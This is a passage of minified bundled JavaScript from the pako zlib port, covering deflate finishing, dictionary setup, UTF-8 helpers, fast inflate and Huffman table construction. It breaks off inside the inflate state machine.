            deflateResetKeep: cn,
            deflateSetHeader: (e, t) => e && e.state ? 2 !== e.state.wrap ? Tt : (e.state.gzhead = t, Mt) : Tt,
            deflate: (e, t) => {
                let n, r;
                if (!e || !e.state || t > xt || t < 0) return e ? Vt(e, Tt) : Tt;
                const i = e.state;
                if (!e.output || !e.input && 0 !== e.avail_in || i.status === qt && t !== It) return Vt(e, 0 === e.avail_out ? Ct : Tt);
                i.strm = e;
                const o = i.last_flush;
                if (i.last_flush = t, 42 === i.status)
                    if (2 === i.wrap) e.adler = 0, Xt(i, 31), Xt(i, 139), Xt(i, 8), i.gzhead ? (Xt(i, (i.gzhead.text ? 1 : 0) + (i.gzhead.hcrc ? 2 : 0) + (i.gzhead.extra ? 4 : 0) + (i.gzhead.name ? 8 : 0) + (i.gzhead.comment ? 16 : 0)), Xt(i, 255 & i.gzhead.time), Xt(i, i.gzhead.time >> 8 & 255), Xt(i, i.gzhead.time >> 16 & 255), Xt(i, i.gzhead.time >> 24 & 255), Xt(i, 9 === i.level ? 2 : i.strategy >= Nt || i.level < 2 ? 4 : 0), Xt(i, 255 & i.gzhead.os), i.gzhead.extra && i.gzhead.extra.length && (Xt(i, 255 & i.gzhead.extra.length), Xt(i, i.gzhead.extra.length >> 8 & 255)), i.gzhead.hcrc && (e.adler = yt(e.adler, i.pending_buf, i.pending, 0)), i.gzindex = 0, i.status = 69) : (Xt(i, 0), Xt(i, 0), Xt(i, 0), Xt(i, 0), Xt(i, 0), Xt(i, 9 === i.level ? 2 : i.strategy >= Nt || i.level < 2 ? 4 : 0), Xt(i, 3), i.status = Kt);
                    else {
                        let t = jt + (i.w_bits - 8 << 4) << 8,
                            n = -1;
                        n = i.strategy >= Nt || i.level < 2 ? 0 : i.level < 6 ? 1 : 6 === i.level ? 2 : 3, t |= n << 6, 0 !== i.strstart && (t |= 32), t += 31 - t % 31, i.status = Kt, $t(i, t), 0 !== i.strstart && ($t(i, e.adler >>> 16), $t(i, 65535 & e.adler)), e.adler = 1
                    }
                if (69 === i.status)
                    if (i.gzhead.extra) {
                        for (n = i.pending; i.gzindex < (65535 & i.gzhead.extra.length) && (i.pending !== i.pending_buf_size || (i.gzhead.hcrc && i.pending > n && (e.adler = yt(e.adler, i.pending_buf, i.pending - n, n)), Zt(e), n = i.pending, i.pending !== i.pending_buf_size));) Xt(i, 255 & i.gzhead.extra[i.gzindex]), i.gzindex++;
                        i.gzhead.hcrc && i.pending > n && (e.adler = yt(e.adler, i.pending_buf, i.pending - n, n)), i.gzindex === i.gzhead.extra.length && (i.gzindex = 0, i.status = 73)
                    } else i.status = 73;
                if (73 === i.status)
                    if (i.gzhead.name) {
                        n = i.pending;
                        do {
                            if (i.pending === i.pending_buf_size && (i.gzhead.hcrc && i.pending > n && (e.adler = yt(e.adler, i.pending_buf, i.pending - n, n)), Zt(e), n = i.pending, i.pending === i.pending_buf_size)) {
                                r = 1;
                                break
                            }
                            r = i.gzindex < i.gzhead.name.length ? 255 & i.gzhead.name.charCodeAt(i.gzindex++) : 0, Xt(i, r)
                        } while (0 !== r);
                        i.gzhead.hcrc && i.pending > n && (e.adler = yt(e.adler, i.pending_buf, i.pending - n, n)), 0 === r && (i.gzindex = 0, i.status = 91)
                    } else i.status = 91;
                if (91 === i.status)
                    if (i.gzhead.comment) {
                        n = i.pending;
                        do {
                            if (i.pending === i.pending_buf_size && (i.gzhead.hcrc && i.pending > n && (e.adler = yt(e.adler, i.pending_buf, i.pending - n, n)), Zt(e), n = i.pending, i.pending === i.pending_buf_size)) {
                                r = 1;
                                break
                            }
                            r = i.gzindex < i.gzhead.comment.length ? 255 & i.gzhead.comment.charCodeAt(i.gzindex++) : 0, Xt(i, r)
                        } while (0 !== r);
                        i.gzhead.hcrc && i.pending > n && (e.adler = yt(e.adler, i.pending_buf, i.pending - n, n)), 0 === r && (i.status = Wt)
                    } else i.status = Wt;
                if (i.status === Wt && (i.gzhead.hcrc ? (i.pending + 2 > i.pending_buf_size && Zt(e), i.pending + 2 <= i.pending_buf_size && (Xt(i, 255 & e.adler), Xt(i, e.adler >> 8 & 255), e.adler = 0, i.status = Kt)) : i.status = Kt), 0 !== i.pending) {
                    if (Zt(e), 0 === e.avail_out) return i.last_flush = -1, Mt
                } else if (0 === e.avail_in && Qt(t) <= Qt(o) && t !== It) return Vt(e, Ct);
                if (i.status === qt && 0 !== e.avail_in) return Vt(e, Ct);
                if (0 !== e.avail_in || 0 !== i.lookahead || t !== _t && i.status !== qt) {
                    let n = i.strategy === Nt ? ((e, t) => {
                        let n;
                        for (;;) {
                            if (0 === e.lookahead && (nn(e), 0 === e.lookahead)) {
                                if (t === _t) return 1;
                                break
                            }
                            if (e.match_length = 0, n = At(e, 0, e.window[e.strstart]), e.lookahead--, e.strstart++, n && (Jt(e, !1), 0 === e.strm.avail_out)) return 1
                        }
                        return e.insert = 0, t === It ? (Jt(e, !0), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (Jt(e, !1), 0 === e.strm.avail_out) ? 1 : 2
                    })(i, t) : i.strategy === Rt ? ((e, t) => {
                        let n, r, i, o;
                        const s = e.window;
                        for (;;) {
                            if (e.lookahead <= Ft) {
                                if (nn(e), e.lookahead <= Ft && t === _t) return 1;
                                if (0 === e.lookahead) break
                            }
                            if (e.match_length = 0, e.lookahead >= 3 && e.strstart > 0 && (i = e.strstart - 1, r = s[i], r === s[++i] && r === s[++i] && r === s[++i])) {
                                o = e.strstart + Ft;
                                do {} while (r === s[++i] && r === s[++i] && r === s[++i] && r === s[++i] && r === s[++i] && r === s[++i] && r === s[++i] && r === s[++i] && i < o);
                                e.match_length = Ft - (o - i), e.match_length > e.lookahead && (e.match_length = e.lookahead)
                            }
                            if (e.match_length >= 3 ? (n = At(e, 1, e.match_length - 3), e.lookahead -= e.match_length, e.strstart += e.match_length, e.match_length = 0) : (n = At(e, 0, e.window[e.strstart]), e.lookahead--, e.strstart++), n && (Jt(e, !1), 0 === e.strm.avail_out)) return 1
                        }
                        return e.insert = 0, t === It ? (Jt(e, !0), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (Jt(e, !1), 0 === e.strm.avail_out) ? 1 : 2
                    })(i, t) : an[i.level].func(i, t);
                    if (3 !== n && 4 !== n || (i.status = qt), 1 === n || 3 === n) return 0 === e.avail_out && (i.last_flush = -1), Mt;
                    if (2 === n && (t === Et ? kt(i) : t !== xt && (bt(i, 0, 0, !1), t === St && (Gt(i.head), 0 === i.lookahead && (i.strstart = 0, i.block_start = 0, i.insert = 0))), Zt(e), 0 === e.avail_out)) return i.last_flush = -1, Mt
                }
                return t !== It ? Mt : i.wrap <= 0 ? Bt : (2 === i.wrap ? (Xt(i, 255 & e.adler), Xt(i, e.adler >> 8 & 255), Xt(i, e.adler >> 16 & 255), Xt(i, e.adler >> 24 & 255), Xt(i, 255 & e.total_in), Xt(i, e.total_in >> 8 & 255), Xt(i, e.total_in >> 16 & 255), Xt(i, e.total_in >> 24 & 255)) : ($t(i, e.adler >>> 16), $t(i, 65535 & e.adler)), Zt(e), i.wrap > 0 && (i.wrap = -i.wrap), 0 !== i.pending ? Mt : Bt)
            },
            deflateEnd: e => {
                if (!e || !e.state) return Tt;
                const t = e.state.status;
                return 42 !== t && 69 !== t && 73 !== t && 91 !== t && t !== Wt && t !== Kt && t !== qt ? Vt(e, Tt) : (e.state = null, t === Kt ? Vt(e, Ot) : Mt)
            },
            deflateSetDictionary: (e, t) => {
                let n = t.length;
                if (!e || !e.state) return Tt;
                const r = e.state,
                    i = r.wrap;
                if (2 === i || 1 === i && 42 !== r.status || r.lookahead) return Tt;
                if (1 === i && (e.adler = dt(e.adler, t, n, 0)), r.wrap = 0, n >= r.w_size) {
                    0 === i && (Gt(r.head), r.strstart = 0, r.block_start = 0, r.insert = 0);
                    let e = new Uint8Array(r.w_size);
                    e.set(t.subarray(n - r.w_size, n), 0), t = e, n = r.w_size
                }
                const o = e.avail_in,
                    s = e.next_in,
                    a = e.input;
                for (e.avail_in = n, e.next_in = 0, e.input = t, nn(r); r.lookahead >= 3;) {
                    let e = r.strstart,
                        t = r.lookahead - 2;
                    do {
                        r.ins_h = Yt(r, r.ins_h, r.window[e + 3 - 1]), r.prev[e & r.w_mask] = r.head[r.ins_h], r.head[r.ins_h] = e, e++
                    } while (--t);
                    r.strstart = e, r.lookahead = 2, nn(r)
                }
                return r.strstart += r.lookahead, r.block_start = r.strstart, r.insert = r.lookahead, r.lookahead = 0, r.match_length = r.prev_length = 2, r.match_available = 0, e.next_in = s, e.input = a, e.avail_in = o, r.wrap = i, Mt
            },
            deflateInfo: "pako deflate (from Nodeca project)"
        };
        const dn = (e, t) => Object.prototype.hasOwnProperty.call(e, t);
        var pn = function(e) {
                const t = Array.prototype.slice.call(arguments, 1);
                for (; t.length;) {
                    const n = t.shift();
                    if (n) {
                        if ("object" !== typeof n) throw new TypeError(n + "must be non-object");
                        for (const t in n) dn(n, t) && (e[t] = n[t])
                    }
                }
                return e
            },
            yn = e => {
                let t = 0;
                for (let r = 0, i = e.length; r < i; r++) t += e[r].length;
                const n = new Uint8Array(t);
                for (let r = 0, i = 0, o = e.length; r < o; r++) {
                    let t = e[r];
                    n.set(t, i), i += t.length
                }
                return n
            };
        let gn = !0;
        try {
            String.fromCharCode.apply(null, new Uint8Array(1))
        } catch (Au) {
            gn = !1
        }
        const mn = new Uint8Array(256);
        for (let ku = 0; ku < 256; ku++) mn[ku] = ku >= 252 ? 6 : ku >= 248 ? 5 : ku >= 240 ? 4 : ku >= 224 ? 3 : ku >= 192 ? 2 : 1;
        mn[254] = mn[254] = 1;
        var wn = e => {
                if ("function" === typeof TextEncoder && TextEncoder.prototype.encode) return (new TextEncoder).encode(e);
                let t, n, r, i, o, s = e.length,
                    a = 0;
                for (i = 0; i < s; i++) n = e.charCodeAt(i), 55296 === (64512 & n) && i + 1 < s && (r = e.charCodeAt(i + 1), 56320 === (64512 & r) && (n = 65536 + (n - 55296 << 10) + (r - 56320), i++)), a += n < 128 ? 1 : n < 2048 ? 2 : n < 65536 ? 3 : 4;
                for (t = new Uint8Array(a), o = 0, i = 0; o < a; i++) n = e.charCodeAt(i), 55296 === (64512 & n) && i + 1 < s && (r = e.charCodeAt(i + 1), 56320 === (64512 & r) && (n = 65536 + (n - 55296 << 10) + (r - 56320), i++)), n < 128 ? t[o++] = n : n < 2048 ? (t[o++] = 192 | n >>> 6, t[o++] = 128 | 63 & n) : n < 65536 ? (t[o++] = 224 | n >>> 12, t[o++] = 128 | n >>> 6 & 63, t[o++] = 128 | 63 & n) : (t[o++] = 240 | n >>> 18, t[o++] = 128 | n >>> 12 & 63, t[o++] = 128 | n >>> 6 & 63, t[o++] = 128 | 63 & n);
                return t
            },
            bn = (e, t) => {
                const n = t || e.length;
                if ("function" === typeof TextDecoder && TextDecoder.prototype.decode) return (new TextDecoder).decode(e.subarray(0, t));
                let r, i;
                const o = new Array(2 * n);
                for (i = 0, r = 0; r < n;) {
                    let t = e[r++];
                    if (t < 128) {
                        o[i++] = t;
                        continue
                    }
                    let s = mn[t];
                    if (s > 4) o[i++] = 65533, r += s - 1;
                    else {
                        for (t &= 2 === s ? 31 : 3 === s ? 15 : 7; s > 1 && r < n;) t = t << 6 | 63 & e[r++], s--;
                        s > 1 ? o[i++] = 65533 : t < 65536 ? o[i++] = t : (t -= 65536, o[i++] = 55296 | t >> 10 & 1023, o[i++] = 56320 | 1023 & t)
                    }
                }
                return ((e, t) => {
                    if (t < 65534 && e.subarray && gn) return String.fromCharCode.apply(null, e.length === t ? e : e.subarray(0, t));
                    let n = "";
                    for (let r = 0; r < t; r++) n += String.fromCharCode(e[r]);
                    return n
                })(o, i)
            },
            vn = (e, t) => {
                (t = t || e.length) > e.length && (t = e.length);
                let n = t - 1;
                for (; n >= 0 && 128 === (192 & e[n]);) n--;
                return n < 0 || 0 === n ? t : n + mn[e[n]] > t ? n : t
            };
        var An = function() {
            this.input = null, this.next_in = 0, this.avail_in = 0, this.total_in = 0, this.output = null, this.next_out = 0, this.avail_out = 0, this.total_out = 0, this.msg = "", this.state = null, this.data_type = 2, this.adler = 0
        };
        const kn = Object.prototype.toString,
            {
                Z_NO_FLUSH: _n,
                Z_SYNC_FLUSH: En,
                Z_FULL_FLUSH: Sn,
                Z_FINISH: In,
                Z_OK: xn,
                Z_STREAM_END: Mn,
                Z_DEFAULT_COMPRESSION: Bn,
                Z_DEFAULT_STRATEGY: Tn,
                Z_DEFLATED: On
            } = mt;

        function Cn(e) {
            this.options = pn({
                level: Bn,
                method: On,
                chunkSize: 16384,
                windowBits: 15,
                memLevel: 8,
                strategy: Tn
            }, e || {});
            let t = this.options;
            t.raw && t.windowBits > 0 ? t.windowBits = -t.windowBits : t.gzip && t.windowBits > 0 && t.windowBits < 16 && (t.windowBits += 16), this.err = 0, this.msg = "", this.ended = !1, this.chunks = [], this.strm = new An, this.strm.avail_out = 0;
            let n = hn.deflateInit2(this.strm, t.level, t.method, t.windowBits, t.memLevel, t.strategy);
            if (n !== xn) throw new Error(gt[n]);
            if (t.header && hn.deflateSetHeader(this.strm, t.header), t.dictionary) {
                let e;
                if (e = "string" === typeof t.dictionary ? wn(t.dictionary) : "[object ArrayBuffer]" === kn.call(t.dictionary) ? new Uint8Array(t.dictionary) : t.dictionary, n = hn.deflateSetDictionary(this.strm, e), n !== xn) throw new Error(gt[n]);
                this._dict_set = !0
            }
        }

        function Pn(e, t) {
            const n = new Cn(t);
            if (n.push(e, !0), n.err) throw n.msg || gt[n.err];
            return n.result
        }
        Cn.prototype.push = function(e, t) {
            const n = this.strm,
                r = this.options.chunkSize;
            let i, o;
            if (this.ended) return !1;
            for (o = t === ~~t ? t : !0 === t ? In : _n, "string" === typeof e ? n.input = wn(e) : "[object ArrayBuffer]" === kn.call(e) ? n.input = new Uint8Array(e) : n.input = e, n.next_in = 0, n.avail_in = n.input.length;;)
                if (0 === n.avail_out && (n.output = new Uint8Array(r), n.next_out = 0, n.avail_out = r), (o === En || o === Sn) && n.avail_out <= 6) this.onData(n.output.subarray(0, n.next_out)), n.avail_out = 0;
                else {
                    if (i = hn.deflate(n, o), i === Mn) return n.next_out > 0 && this.onData(n.output.subarray(0, n.next_out)), i = hn.deflateEnd(this.strm), this.onEnd(i), this.ended = !0, i === xn;
                    if (0 !== n.avail_out) {
                        if (o > 0 && n.next_out > 0) this.onData(n.output.subarray(0, n.next_out)), n.avail_out = 0;
                        else if (0 === n.avail_in) break
                    } else this.onData(n.output)
                }
            return !0
        }, Cn.prototype.onData = function(e) {
            this.chunks.push(e)
        }, Cn.prototype.onEnd = function(e) {
            e === xn && (this.result = yn(this.chunks)), this.chunks = [], this.err = e, this.msg = this.strm.msg
        };
        var Ln = {
            Deflate: Cn,
            deflate: Pn,
            deflateRaw: function(e, t) {
                return (t = t || {}).raw = !0, Pn(e, t)
            },
            gzip: function(e, t) {
                return (t = t || {}).gzip = !0, Pn(e, t)
            },
            constants: mt
        };
        var Nn = function(e, t) {
            let n, r, i, o, s, a, u, c, l, f, h, d, p, y, g, m, w, b, v, A, k, _, E, S;
            const I = e.state;
            n = e.next_in, E = e.input, r = n + (e.avail_in - 5), i = e.next_out, S = e.output, o = i - (t - e.avail_out), s = i + (e.avail_out - 257), a = I.dmax, u = I.wsize, c = I.whave, l = I.wnext, f = I.window, h = I.hold, d = I.bits, p = I.lencode, y = I.distcode, g = (1 << I.lenbits) - 1, m = (1 << I.distbits) - 1;
            e: do {
                d < 15 && (h += E[n++] << d, d += 8, h += E[n++] << d, d += 8), w = p[h & g];
                t: for (;;) {
                    if (b = w >>> 24, h >>>= b, d -= b, b = w >>> 16 & 255, 0 === b) S[i++] = 65535 & w;
                    else {
                        if (!(16 & b)) {
                            if (0 === (64 & b)) {
                                w = p[(65535 & w) + (h & (1 << b) - 1)];
                                continue t
                            }
                            if (32 & b) {
                                I.mode = 12;
                                break e
                            }
                            e.msg = "invalid literal/length code", I.mode = 30;
                            break e
                        }
                        v = 65535 & w, b &= 15, b && (d < b && (h += E[n++] << d, d += 8), v += h & (1 << b) - 1, h >>>= b, d -= b), d < 15 && (h += E[n++] << d, d += 8, h += E[n++] << d, d += 8), w = y[h & m];
                        n: for (;;) {
                            if (b = w >>> 24, h >>>= b, d -= b, b = w >>> 16 & 255, !(16 & b)) {
                                if (0 === (64 & b)) {
                                    w = y[(65535 & w) + (h & (1 << b) - 1)];
                                    continue n
                                }
                                e.msg = "invalid distance code", I.mode = 30;
                                break e
                            }
                            if (A = 65535 & w, b &= 15, d < b && (h += E[n++] << d, d += 8, d < b && (h += E[n++] << d, d += 8)), A += h & (1 << b) - 1, A > a) {
                                e.msg = "invalid distance too far back", I.mode = 30;
                                break e
                            }
                            if (h >>>= b, d -= b, b = i - o, A > b) {
                                if (b = A - b, b > c && I.sane) {
                                    e.msg = "invalid distance too far back", I.mode = 30;
                                    break e
                                }
                                if (k = 0, _ = f, 0 === l) {
                                    if (k += u - b, b < v) {
                                        v -= b;
                                        do {
                                            S[i++] = f[k++]
                                        } while (--b);
                                        k = i - A, _ = S
                                    }
                                } else if (l < b) {
                                    if (k += u + l - b, b -= l, b < v) {
                                        v -= b;
                                        do {
                                            S[i++] = f[k++]
                                        } while (--b);
                                        if (k = 0, l < v) {
                                            b = l, v -= b;
                                            do {
                                                S[i++] = f[k++]
                                            } while (--b);
                                            k = i - A, _ = S
                                        }
                                    }
                                } else if (k += l - b, b < v) {
                                    v -= b;
                                    do {
                                        S[i++] = f[k++]
                                    } while (--b);
                                    k = i - A, _ = S
                                }
                                for (; v > 2;) S[i++] = _[k++], S[i++] = _[k++], S[i++] = _[k++], v -= 3;
                                v && (S[i++] = _[k++], v > 1 && (S[i++] = _[k++]))
                            } else {
                                k = i - A;
                                do {
                                    S[i++] = S[k++], S[i++] = S[k++], S[i++] = S[k++], v -= 3
                                } while (v > 2);
                                v && (S[i++] = S[k++], v > 1 && (S[i++] = S[k++]))
                            }
                            break
                        }
                    }
                    break
                }
            } while (n < r && i < s);
            v = d >> 3, n -= v, d -= v << 3, h &= (1 << d) - 1, e.next_in = n, e.next_out = i, e.avail_in = n < r ? r - n + 5 : 5 - (n - r), e.avail_out = i < s ? s - i + 257 : 257 - (i - s), I.hold = h, I.bits = d
        };
        const Rn = 15,
            Dn = new Uint16Array([3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0]),
            zn = new Uint8Array([16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18, 19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 72, 78]),
            Un = new Uint16Array([1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577, 0, 0]),
            jn = new Uint8Array([16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22, 23, 23, 24, 24, 25, 25, 26, 26, 27, 27, 28, 28, 29, 29, 64, 64]);
        var Fn = (e, t, n, r, i, o, s, a) => {
            const u = a.bits;
            let c, l, f, h, d, p, y = 0,
                g = 0,
                m = 0,
                w = 0,
                b = 0,
                v = 0,
                A = 0,
                k = 0,
                _ = 0,
                E = 0,
                S = null,
                I = 0;
            const x = new Uint16Array(16),
                M = new Uint16Array(16);
            let B, T, O, C = null,
                P = 0;
            for (y = 0; y <= Rn; y++) x[y] = 0;
            for (g = 0; g < r; g++) x[t[n + g]]++;
            for (b = u, w = Rn; w >= 1 && 0 === x[w]; w--);
            if (b > w && (b = w), 0 === w) return i[o++] = 20971520, i[o++] = 20971520, a.bits = 1, 0;
            for (m = 1; m < w && 0 === x[m]; m++);
            for (b < m && (b = m), k = 1, y = 1; y <= Rn; y++)
                if (k <<= 1, k -= x[y], k < 0) return -1;
            if (k > 0 && (0 === e || 1 !== w)) return -1;
            for (M[1] = 0, y = 1; y < Rn; y++) M[y + 1] = M[y] + x[y];
            for (g = 0; g < r; g++) 0 !== t[n + g] && (s[M[t[n + g]]++] = g);
            if (0 === e ? (S = C = s, p = 19) : 1 === e ? (S = Dn, I -= 257, C = zn, P -= 257, p = 256) : (S = Un, C = jn, p = -1), E = 0, g = 0, y = m, d = o, v = b, A = 0, f = -1, _ = 1 << b, h = _ - 1, 1 === e && _ > 852 || 2 === e && _ > 592) return 1;
            for (;;) {
                B = y - A, s[g] < p ? (T = 0, O = s[g]) : s[g] > p ? (T = C[P + s[g]], O = S[I + s[g]]) : (T = 96, O = 0), c = 1 << y - A, l = 1 << v, m = l;
                do {
                    l -= c, i[d + (E >> A) + l] = B << 24 | T << 16 | O | 0
                } while (0 !== l);
                for (c = 1 << y - 1; E & c;) c >>= 1;
                if (0 !== c ? (E &= c - 1, E += c) : E = 0, g++, 0 === --x[y]) {
                    if (y === w) break;
                    y = t[n + s[g]]
                }
                if (y > b && (E & h) !== f) {
                    for (0 === A && (A = b), d += m, v = y - A, k = 1 << v; v + A < w && (k -= x[v + A], !(k <= 0));) v++, k <<= 1;
                    if (_ += 1 << v, 1 === e && _ > 852 || 2 === e && _ > 592) return 1;
                    f = E & h, i[f] = b << 24 | v << 16 | d - o | 0
                }
            }
            return 0 !== E && (i[d + E] = y - A << 24 | 64 << 16 | 0), a.bits = b, 0
        };
        const {
            Z_FINISH: Hn,
            Z_BLOCK: Wn,
            Z_TREES: Kn,
            Z_OK: qn,
            Z_STREAM_END: Vn,
            Z_NEED_DICT: Qn,
            Z_STREAM_ERROR: Gn,
            Z_DATA_ERROR: Yn,
            Z_MEM_ERROR: Zn,
            Z_BUF_ERROR: Jn,
            Z_DEFLATED: Xn
        } = mt, $n = 12, er = 30, tr = e => (e >>> 24 & 255) + (e >>> 8 & 65280) + ((65280 & e) << 8) + ((255 & e) << 24);

        function nr() {
            this.mode = 0, this.last = !1, this.wrap = 0, this.havedict = !1, this.flags = 0, this.dmax = 0, this.check = 0, this.total = 0, this.head = null, this.wbits = 0, this.wsize = 0, this.whave = 0, this.wnext = 0, this.window = null, this.hold = 0, this.bits = 0, this.length = 0, this.offset = 0, this.extra = 0, this.lencode = null, this.distcode = null, this.lenbits = 0, this.distbits = 0, this.ncode = 0, this.nlen = 0, this.ndist = 0, this.have = 0, this.next = null, this.lens = new Uint16Array(320), this.work = new Uint16Array(288), this.lendyn = null, this.distdyn = null, this.sane = 0, this.back = 0, this.was = 0
        }
        const rr = e => {
                if (!e || !e.state) return Gn;
                const t = e.state;
                return e.total_in = e.total_out = t.total = 0, e.msg = "", t.wrap && (e.adler = 1 & t.wrap), t.mode = 1, t.last = 0, t.havedict = 0, t.dmax = 32768, t.head = null, t.hold = 0, t.bits = 0, t.lencode = t.lendyn = new Int32Array(852), t.distcode = t.distdyn = new Int32Array(592), t.sane = 1, t.back = -1, qn
            },
            ir = e => {
                if (!e || !e.state) return Gn;
                const t = e.state;
                return t.wsize = 0, t.whave = 0, t.wnext = 0, rr(e)
            },
            or = (e, t) => {
                let n;
                if (!e || !e.state) return Gn;
                const r = e.state;
                return t < 0 ? (n = 0, t = -t) : (n = 1 + (t >> 4), t < 48 && (t &= 15)), t && (t < 8 || t > 15) ? Gn : (null !== r.window && r.wbits !== t && (r.window = null), r.wrap = n, r.wbits = t, ir(e))
            },
            sr = (e, t) => {
                if (!e) return Gn;
                const n = new nr;
                e.state = n, n.window = null;
                const r = or(e, t);
                return r !== qn && (e.state = null), r
            };
        let ar, ur, cr = !0;
        const lr = e => {
                if (cr) {
                    ar = new Int32Array(512), ur = new Int32Array(32);
                    let t = 0;
                    for (; t < 144;) e.lens[t++] = 8;
                    for (; t < 256;) e.lens[t++] = 9;
                    for (; t < 280;) e.lens[t++] = 7;
                    for (; t < 288;) e.lens[t++] = 8;
                    for (Fn(1, e.lens, 0, 288, ar, 0, e.work, {
                            bits: 9
                        }), t = 0; t < 32;) e.lens[t++] = 5;
                    Fn(2, e.lens, 0, 32, ur, 0, e.work, {
                        bits: 5
                    }), cr = !1
                }
                e.lencode = ar, e.lenbits = 9, e.distcode = ur, e.distbits = 5
            },
            fr = (e, t, n, r) => {
                let i;
                const o = e.state;
                return null === o.window && (o.wsize = 1 << o.wbits, o.wnext = 0, o.whave = 0, o.window = new Uint8Array(o.wsize)), r >= o.wsize ? (o.window.set(t.subarray(n - o.wsize, n), 0), o.wnext = 0, o.whave = o.wsize) : (i = o.wsize - o.wnext, i > r && (i = r), o.window.set(t.subarray(n - r, n - r + i), o.wnext), (r -= i) ? (o.window.set(t.subarray(n - r, n), 0), o.wnext = r, o.whave = o.wsize) : (o.wnext += i, o.wnext === o.wsize && (o.wnext = 0), o.whave < o.wsize && (o.whave += i))), 0
            };
        var hr = (e, t) => {
                let n, r, i, o, s, a, u, c, l, f, h, d, p, y, g, m, w, b, v, A, k, _, E = 0;
                const S = new Uint8Array(4);
                let I, x;
                const M = new Uint8Array([16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]);
                if (!e || !e.state || !e.output || !e.input && 0 !== e.avail_in) return Gn;
                n = e.state, n.mode === $n && (n.mode = 13), s = e.next_out, i = e.output, u = e.avail_out, o = e.next_in, r = e.input, a = e.avail_in, c = n.hold, l = n.bits, f = a, h = u, _ = qn;
                e: for (;;) switch (n.mode) {
                    case 1:
                        if (0 === n.wrap) {
                            n.mode = 13;
                            break
                        }
                        for (; l < 16;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        if (2 & n.wrap && 35615 === c) {
                            n.check = 0, S[0] = 255 & c, S[1] = c >>> 8 & 255, n.check = yt(n.check, S, 2, 0), c = 0, l = 0, n.mode = 2;
                            break
                        }
                        if (n.flags = 0, n.head && (n.head.done = !1), !(1 & n.wrap) || (((255 & c) << 8) + (c >> 8)) % 31) {
                            e.msg = "incorrect header check", n.mode = er;
                            break
                        }
                        if ((15 & c) !== Xn) {
                            e.msg = "unknown compression method", n.mode = er;
                            break
                        }
                        if (c >>>= 4, l -= 4, k = 8 + (15 & c), 0 === n.wbits) n.wbits = k;
                        else if (k > n.wbits) {
                            e.msg = "invalid window size", n.mode = er;
                            break
                        }
                        n.dmax = 1 << n.wbits, e.adler = n.check = 1, n.mode = 512 & c ? 10 : $n, c = 0, l = 0;
                        break;
                    case 2:
                        for (; l < 16;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        if (n.flags = c, (255 & n.flags) !== Xn) {
                            e.msg = "unknown compression method", n.mode = er;
                            break
                        }
                        if (57344 & n.flags) {
                            e.msg = "unknown header flags set", n.mode = er;
                            break
                        }
                        n.head && (n.head.text = c >> 8 & 1), 512 & n.flags && (S[0] = 255 & c, S[1] = c >>> 8 & 255, n.check = yt(n.check, S, 2, 0)), c = 0, l = 0, n.mode = 3;
                    case 3:
                        for (; l < 32;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        n.head && (n.head.time = c), 512 & n.flags && (S[0] = 255 & c, S[1] = c >>> 8 & 255, S[2] = c >>> 16 & 255, S[3] = c >>> 24 & 255, n.check = yt(n.check, S, 4, 0)), c = 0, l = 0, n.mode = 4;
                    case 4:
                        for (; l < 16;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        n.head && (n.head.xflags = 255 & c, n.head.os = c >> 8), 512 & n.flags && (S[0] = 255 & c, S[1] = c >>> 8 & 255, n.check = yt(n.check, S, 2, 0)), c = 0, l = 0, n.mode = 5;
                    case 5:
                        if (1024 & n.flags) {
                            for (; l < 16;) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            n.length = c, n.head && (n.head.extra_len = c), 512 & n.flags && (S[0] = 255 & c, S[1] = c >>> 8 & 255, n.check = yt(n.check, S, 2, 0)), c = 0, l = 0
                        } else n.head && (n.head.extra = null);
                        n.mode = 6;
                    case 6:
                        if (1024 & n.flags && (d = n.length, d > a && (d = a), d && (n.head && (k = n.head.extra_len - n.length, n.head.extra || (n.head.extra = new Uint8Array(n.head.extra_len)), n.head.extra.set(r.subarray(o, o + d), k)), 512 & n.flags && (n.check = yt(n.check, r, d, o)), a -= d, o += d, n.length -= d), n.length)) break e;
                        n.length = 0, n.mode = 7;
                    case 7:
                        if (2048 & n.flags) {
                            if (0 === a) break e;
                            d = 0;
                            do {
                                k = r[o + d++], n.head && k && n.length < 65536 && (n.head.name += String.fromCharCode(k))
                            } while (k && d < a);
                            if (512 & n.flags && (n.check = yt(n.check, r, d, o)), a -= d, o += d, k) break e
                        } else n.head && (n.head.name = null);
                        n.length = 0, n.mode = 8;
                    case 8:
                        if (4096 & n.flags) {
                            if (0 === a) break e;
                            d = 0;
                            do {
                                k = r[o + d++], n.head && k && n.length < 65536 && (n.head.comment += String.fromCharCode(k))
                            } while (k && d < a);
                            if (512 & n.flags && (n.check = yt(n.check, r, d, o)), a -= d, o += d, k) break e
                        } else n.head && (n.head.comment = null);
                        n.mode = 9;
                    case 9:
                        if (512 & n.flags) {
                            for (; l < 16;) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            if (c !== (65535 & n.check)) {
                                e.msg = "header crc mismatch", n.mode = er;
                                break
                            }
                            c = 0, l = 0
                        }
                        n.head && (n.head.hcrc = n.flags >> 9 & 1, n.head.done = !0), e.adler = n.check = 0, n.mode = $n;
                        break;
                    case 10:
                        for (; l < 32;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        e.adler = n.check = tr(c), c = 0, l = 0, n.mode = 11;
                    case 11:
